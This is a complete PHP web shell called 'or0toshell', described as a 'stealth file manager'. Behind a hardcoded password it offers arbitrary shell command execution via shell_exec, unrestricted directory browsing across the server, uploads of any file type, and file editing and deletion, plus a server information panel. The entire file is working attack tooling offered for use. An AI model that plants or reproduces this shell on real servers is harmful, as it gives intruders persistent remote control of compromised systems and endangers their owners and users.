<?php
/**
 * or0toshell - Stealth File Manager with Strong Password Protection & Rate Limiting
 * Developed by Ali Essam
 */
session_start();

// ------------------------ Configuration ------------------------ //
define('ACCESS_PASSWORD', 'ss12%');  // The password to access the file manager
define('MAX_LOGIN_ATTEMPTS', 3);      // Maximum failed login attempts
define('LOGIN_TIMEOUT', 300);         // Time (in seconds) to block further attempts (e.g., 300 seconds = 5 minutes)

// Hide error details (adjust as needed for production)
error_reporting(E_ALL);
ini_set('display_errors', 0);

// ------------------- Rate Limit Check & Login ------------------- //
if (!isset($_SESSION['authenticated'])) {
    // Initialize or update login attempt count and timeout
    if (!isset($_SESSION['login_attempts'])) {
        $_SESSION['login_attempts'] = 0;
        $_SESSION['first_attempt_time'] = time();
    } else {
        // If timeout has passed, reset attempts
        if (time() - $_SESSION['first_attempt_time'] > LOGIN_TIMEOUT) {
            $_SESSION['login_attempts'] = 0;
            $_SESSION['first_attempt_time'] = time();
        }
    }
    
    // Process login form submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
        $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
        
        // Check rate limit first
        if ($_SESSION['login_attempts'] >= MAX_LOGIN_ATTEMPTS) {
            $_SESSION['login_error'] = "Too many failed attempts. Please try again later.";
        } else {
            if ($password === ACCESS_PASSWORD) {
                // Successful login
                session_regenerate_id(true);
                $_SESSION['authenticated'] = true;
                // Reset login attempts on success
                $_SESSION['login_attempts'] = 0;
                header("Location: " . $_SERVER['PHP_SELF']);
                exit;
            } else {
                $_SESSION['login_attempts']++;
                $_SESSION['login_error'] = "Incorrect password.";
            }
        }
    }
    
    // Display ONLY the login form if not authenticated
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>or0toshell - Login</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
      <style>
        body {
          background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
          height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
          color: #e0e0e0;
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .login-card {
          background: rgba(255, 255, 255, 0.05);
          padding: 2rem;
          border-radius: 8px;
          box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }
        .login-card input[type="password"] {
          background: transparent;
          border: 1px solid rgba(255,255,255,0.2);
          color: #e0e0e0;
        }
        .login-card .btn {
          border-radius: 0.5rem;
        }
      </style>
    </head>
    <body>
      <div class="login-card text-center">
        <h2>or0toshell Login</h2>
        <?php if(isset($_SESSION['login_error'])): ?>
          <div class="alert alert-danger">
            <?= htmlspecialchars($_SESSION['login_error']); unset($_SESSION['login_error']); ?>
          </div>
        <?php endif; ?>
        <form method="post">
          <div class="mb-3">
            <input type="password" name="password" class="form-control" placeholder="Enter Password" required autofocus>
          </div>
          <button type="submit" name="login" class="btn btn-outline-warning">Login</button>
        </form>
      </div>
    </body>
    </html>
    <?php
    exit;
}

// ------------------------ File Manager Code Below ------------------------ //

// Base directory (root)
$rootPath = realpath(__DIR__);

// ---------------------- Helper Functions ------------------------- //

/**
 * Format bytes into a human-friendly format.
 */
function formatSizeUnits($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return $bytes . ' byte';
    }
    return '0 bytes';
}

/**
 * Return file extension in lowercase.
 */
function fileExtension($file) {
    return strtolower(pathinfo($file, PATHINFO_EXTENSION));
}

/**
 * Return HTML icon string based on file type.
 */
function fileIcon($file) {
    $ext = fileExtension($file);
    $imgExts   = ["apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp"];
    $audioExts = ["wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc"];
    
    if ($file === "error_log") {
        return '<i class="fa-solid fa-bug"></i>';
    } elseif ($file === ".htaccess") {
        return '<i class="fa-solid fa-lock"></i>';
    }
    
    if (in_array($ext, ["html", "htm"])) {
        return '<i class="fa-brands fa-html5"></i>';
    } elseif (in_array($ext, ["php", "phtml"])) {
        return '<i class="fa-brands fa-php"></i>';
    } elseif (in_array($ext, $imgExts)) {
        return '<i class="fa-regular fa-images"></i>';
    } elseif ($ext === "css") {
        return '<i class="fa-brands fa-css3-alt"></i>';
    } elseif ($ext === "txt") {
        return '<i class="fa-regular fa-file-lines"></i>';
    } elseif (in_array($ext, $audioExts)) {
        return '<i class="fa-solid fa-music"></i>';
    } elseif ($ext === "py") {
        return '<i class="fa-brands fa-python"></i>';
    } elseif ($ext === "js") {
        return '<i class="fa-brands fa-js"></i>';
    }
    return '<i class="fa-solid fa-file"></i>';
}

/**
 * Encode a path for safe URL usage.
 */
function encodePath($path) {
    return urlencode(base64_encode($path));
}

/**
 * Decode an encoded path.
 */
function decodePath($encoded) {
    return base64_decode(urldecode($encoded));
}

/**
 * Generate breadcrumb navigation.
 */
function generateBreadcrumb($path) {
    $cleanPath = trim(str_replace('\\', '/', $path), '/');
    $parts = explode('/', $cleanPath);
    $breadcrumb = '<a href="?p=' . encodePath(DIRECTORY_SEPARATOR) . '">Root</a>';
    $current = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb .= ' / <a href="?p=' . encodePath($current) . '">' . htmlspecialchars($part) . '</a>';
    }
    return $breadcrumb;
}

/**
 * CSRF token generation.
 */
function generateCsrfToken() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

/**
 * Verify CSRF token.
 */
function verifyCsrfToken($token) {
    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}

// ---------------------- Determine Current Directory ---------------------- //
$currentPath = $rootPath;
if ($p = filter_input(INPUT_GET, 'p')) {
    $decoded = decodePath($p);
    if (is_dir($decoded)) {
        $currentPath = realpath($decoded);
    } else {
        $_SESSION['message'] = "Invalid directory.";
        header("Location: ?p=" . encodePath($rootPath));
        exit;
    }
} elseif ($q = filter_input(INPUT_GET, 'q')) {
    $decoded = decodePath($q);
    if (is_dir($decoded)) {
        $currentPath = realpath($decoded);
    } else {
        header("Location: ?p=" . encodePath($rootPath));
        exit;
    }
}
define("CURRENT_PATH", $currentPath);

// ---------------------- POST Request Handling ---------------------- //
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $csrfToken = filter_input(INPUT_POST, 'csrf_token', FILTER_SANITIZE_STRING);
    if (!verifyCsrfToken($csrfToken)) {
        $_SESSION['message'] = "Security token mismatch.";
        header("Location: ?p=" . encodePath(CURRENT_PATH));
        exit;
    }

    // Rename file/folder
    if (isset($_POST['rename']) && ($r = filter_input(INPUT_GET, 'r', FILTER_SANITIZE_STRING))) {
        $oldItem = CURRENT_PATH . DIRECTORY_SEPARATOR . basename($r);
        $newName = basename(filter_input(INPUT_POST, 'name', FILTER_SANITIZE_STRING));
        $newItem = CURRENT_PATH . DIRECTORY_SEPARATOR . $newName;
        if (rename($oldItem, $newItem)) {
            $_SESSION['message'] = "Renamed successfully.";
        } else {
            $_SESSION['message'] = "Rename failed.";
        }
        header("Location: ?p=" . encodePath(CURRENT_PATH));
        exit;
    }

    // Edit file content
    if (isset($_POST['edit']) && ($e = filter_input(INPUT_GET, 'e', FILTER_SANITIZE_STRING))) {
        $fileName = basename($e);
        $filePath = CURRENT_PATH . DIRECTORY_SEPARATOR . $fileName;
        if (is_file($filePath) && file_put_contents($filePath, $_POST['data']) !== false) {
            $_SESSION['message'] = "File saved.";
        } else {
            $_SESSION['message'] = "Error saving file.";
        }
        header("Location: ?p=" . encodePath(CURRENT_PATH));
        exit;
    }

    // Upload file
    if (isset($_POST['upload'])) {
        if (isset($_FILES['fileToUpload']) && $_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
            $targetFile = basename($_FILES['fileToUpload']['name']);
            $targetPath = CURRENT_PATH . DIRECTORY_SEPARATOR . $targetFile;
            // Optional: whitelist allowed file types here
            if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetPath)) {
                $_SESSION['message'] = "Upload successful.";
            } else {
                $_SESSION['message'] = "Upload failed.";
            }
        }
        header("Location: ?p=" . encodePath(CURRENT_PATH));
        exit;
    }

    // Execute shell command (use with caution)
    if (isset($_POST['execute_cmd'])) {
        $cmd = trim($_POST['cmd']);
        $output = shell_exec($cmd);
        $_SESSION['cmd_output'] = $output;
        header("Location: ?p=" . encodePath(CURRENT_PATH));
        exit;
    }
}

// ---------------------- Delete File/Folder ---------------------- //
if ($d = filter_input(INPUT_GET, 'd', FILTER_SANITIZE_STRING)) {
    $itemName = basename($d);
    $itemPath = CURRENT_PATH . DIRECTORY_SEPARATOR . $itemName;
    if (is_file($itemPath)) {
        if (unlink($itemPath)) {
            $_SESSION['message'] = "File deleted.";
        } else {
            $_SESSION['message'] = "Deletion error.";
        }
    } elseif (is_dir($itemPath)) {
        if (rmdir($itemPath)) {
            $_SESSION['message'] = "Directory deleted.";
        } else {
            $_SESSION['message'] = "Deletion error (directory not empty).";
        }
    }
    header("Location: ?p=" . encodePath(CURRENT_PATH));
    exit;
}

// ---------------------- Directory Listing ---------------------- //
$folders = [];
$files = [];
if (is_readable(CURRENT_PATH)) {
    $items = scandir(CURRENT_PATH);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = CURRENT_PATH . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } elseif (is_file($fullPath)) {
            $files[] = $item;
        }
    }
}

// ---------------------- System Info (Hidden) ---------------------- //
$system_info = [
    'Operating System' => 'Hidden',
    'PHP Version'      => 'Hidden',
    'Server Software'  => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
    'Document Root'    => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
    'Current Directory'=> CURRENT_PATH,
    'Free Disk Space'  => formatSizeUnits(disk_free_space(CURRENT_PATH)),
    'Total Disk Space' => formatSizeUnits(disk_total_space(CURRENT_PATH))
];

$message = $_SESSION['message'] ?? '';
$cmd_output = $_SESSION['cmd_output'] ?? '';
unset($_SESSION['message'], $_SESSION['cmd_output']);

$csrfToken = generateCsrfToken();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>or0toshell</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- Bootstrap 5 & Font Awesome -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" rel="stylesheet">
  <style>
    /* Dark & Glassy UI */
    body {
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #e0e0e0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .glass {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(8px);
      border-radius: 8px;
    }
    a, .breadcrumb a {
      color: #f0ad4e;
      text-decoration: none;
    }
    a:hover {
      color: #ec971f;
    }
    .navbar, .card, .btn, .form-control {
      border-radius: 0.5rem;
    }
    .btn-outline-warning {
      color: #f0ad4e;
      border-color: #f0ad4e;
    }
    .btn-outline-warning:hover {
      background-color: #f0ad4e;
      color: #fff;
    }
    pre {
      background: rgba(0, 0, 0, 0.8);
      padding: 15px;
      border-radius: 5px;
      overflow-x: auto;
    }
    .footer a {
      color: #f0ad4e;
    }
    .table td, .table th {
      vertical-align: middle;
    }
  </style>
</head>
<body>
<div class="container py-4">
  <nav class="navbar navbar-expand-lg glass mb-4">
    <a class="navbar-brand fw-bold" href="?p=<?= encodePath(CURRENT_PATH) ?>">or0toshell</a>
    <div class="ms-auto">
      <a href="?p=<?= encodePath($rootPath) ?>" class="btn btn-sm btn-outline-warning me-2">Home</a>
      <a href="?p=<?= encodePath(CURRENT_PATH) ?>&upload=1" class="btn btn-sm btn-outline-warning">Upload</a>
    </div>
  </nav>

  <?php if ($message): ?>
    <div class="alert alert-warning glass"><?= htmlspecialchars($message) ?></div>
  <?php endif; ?>

  <div class="card glass mb-4">
    <div class="card-header">System Information</div>
    <div class="card-body">
      <table class="table table-borderless mb-0">
        <?php foreach ($system_info as $key => $value): ?>
          <tr>
            <th><?= htmlspecialchars($key) ?></th>
            <td><?= htmlspecialchars($value) ?></td>
          </tr>
        <?php endforeach; ?>
      </table>
    </div>
  </div>

  <div class="card glass mb-4">
    <div class="card-header">Execute Command</div>
    <div class="card-body">
      <form method="post" class="row g-2">
        <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
        <div class="col-md-10">
          <input type="text" name="cmd" class="form-control" placeholder="Enter command" required>
        </div>
        <div class="col-md-2">
          <button type="submit" name="execute_cmd" class="btn btn-outline-warning w-100">Run</button>
        </div>
      </form>
      <?php if ($cmd_output): ?>
        <hr>
        <h6>Output:</h6>
        <pre><?= htmlspecialchars($cmd_output) ?></pre>
      <?php endif; ?>
    </div>
  </div>

  <nav aria-label="breadcrumb" class="mb-4">
    <?= generateBreadcrumb(CURRENT_PATH) ?>
  </nav>

  <?php if (isset($_GET['upload'])): ?>
    <div class="card glass mb-4">
      <div class="card-header">Upload File</div>
      <div class="card-body">
        <form method="post" enctype="multipart/form-data">
          <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
          <div class="mb-3">
            <label for="fileToUpload" class="form-label">Choose file:</label>
            <input type="file" name="fileToUpload" id="fileToUpload" class="form-control" required>
          </div>
          <button type="submit" name="upload" class="btn btn-outline-warning">Upload</button>
        </form>
      </div>
    </div>
  <?php endif; ?>

  <?php if (filter_input(INPUT_GET, 'r') && filter_input(INPUT_GET, 'q')): ?>
    <div class="card glass mb-4">
      <div class="card-header">Rename: <?= htmlspecialchars(filter_input(INPUT_GET, 'r', FILTER_SANITIZE_STRING)) ?></div>
      <div class="card-body">
        <form method="post">
          <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
          <div class="mb-3">
            <label for="renameInput" class="form-label">New name:</label>
            <input type="text" name="name" id="renameInput" class="form-control" value="<?= htmlspecialchars(filter_input(INPUT_GET, 'r', FILTER_SANITIZE_STRING)) ?>" required>
          </div>
          <button type="submit" name="rename" class="btn btn-outline-warning">Rename</button>
        </form>
      </div>
    </div>
  <?php endif; ?>

  <?php if (filter_input(INPUT_GET, 'e') && filter_input(INPUT_GET, 'q')): ?>
    <?php 
      $fileName = basename(filter_input(INPUT_GET, 'e', FILTER_SANITIZE_STRING));
      $filePath = CURRENT_PATH . DIRECTORY_SEPARATOR . $fileName;
      $fileContent = is_file($filePath) ? file_get_contents($filePath) : '';
    ?>
    <div class="card glass mb-4">
      <div class="card-header">Editing File: <?= htmlspecialchars($fileName) ?></div>
      <div class="card-body">
        <form method="post">
          <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
          <div class="mb-3">
            <textarea name="data" rows="10" class="form-control" required><?= htmlspecialchars($fileContent) ?></textarea>
          </div>
          <button type="submit" name="edit" class="btn btn-outline-warning">Save</button>
        </form>
      </div>
    </div>
  <?php endif; ?>

  <div class="card glass">
    <div class="card-header">Directory: <?= htmlspecialchars(CURRENT_PATH) ?></div>
    <div class="card-body p-0">
      <table class="table table-hover m-0">
        <thead class="table-dark">
          <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Perms</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          <?php foreach ($folders as $folder): ?>
            <tr>
              <td>
                <i class="fa-solid fa-folder"></i>
                <a href="?p=<?= encodePath(CURRENT_PATH . DIRECTORY_SEPARATOR . $folder) ?>"><?= htmlspecialchars($folder) ?></a>
              </td>
              <td>—</td>
              <td><?= date("M d, Y H:i", filemtime(CURRENT_PATH . DIRECTORY_SEPARATOR . $folder)) ?></td>
              <td><?= substr(decoct(fileperms(CURRENT_PATH . DIRECTORY_SEPARATOR . $folder)), -3) ?></td>
              <td>
                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&r=<?= urlencode($folder) ?>" title="Rename">
                  <i class="fa-solid fa-pen-to-square"></i>
                </a>
                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&d=<?= urlencode($folder) ?>" title="Delete" onclick="return confirm('Delete this folder?');">
                  <i class="fa-solid fa-trash"></i>
                </a>
              </td>
            </tr>
          <?php endforeach; ?>
          <?php foreach ($files as $file): ?>
            <tr>
              <td><?= fileIcon($file) ?> <?= htmlspecialchars($file) ?></td>
              <td><?= formatSizeUnits(filesize(CURRENT_PATH . DIRECTORY_SEPARATOR . $file)) ?></td>
              <td><?= date("M d, Y H:i", filemtime(CURRENT_PATH . DIRECTORY_SEPARATOR . $file)) ?></td>
              <td><?= substr(decoct(fileperms(CURRENT_PATH . DIRECTORY_SEPARATOR . $file)), -3) ?></td>
              <td>
                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&e=<?= urlencode($file) ?>" title="Edit">
                  <i class="fa-solid fa-file-pen"></i>
                </a>
                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&r=<?= urlencode($file) ?>" title="Rename">
                  <i class="fa-solid fa-pen-to-square"></i>
                </a>
                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&d=<?= urlencode($file) ?>" title="Delete" onclick="return confirm('Delete this file?');">
                  <i class="fa-solid fa-trash"></i>
                </a>
              </td>
            </tr>
          <?php endforeach; ?>
          <?php if (empty($folders) && empty($files)): ?>
            <tr>
              <td colspan="5" class="text-center">No files or folders found.</td>
            </tr>
          <?php endif; ?>
        </tbody>
      </table>
    </div>
  </div>

  <div class="footer text-center mt-4">
    or0toshell - Developed by <a href="https://www.linkedin.com/in/dragonked2" target="_blank">Ali Essam</a>
  </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
